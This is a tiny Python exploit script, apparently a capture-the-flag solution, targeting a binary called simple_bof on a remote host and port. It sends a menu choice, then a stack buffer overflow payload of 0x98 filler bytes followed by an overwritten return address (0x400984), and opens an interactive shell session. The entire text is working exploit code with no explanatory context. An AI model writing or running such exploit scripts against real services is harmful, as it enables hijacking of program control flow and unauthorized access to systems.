from yeonnic import *

p=remote("211.110.229.114",13623)
#p=process("./simple_bof")

p.sendline("4")
print p.recv()
p.sendline("A"*0x98+p64(0x400984))

p.interactive()
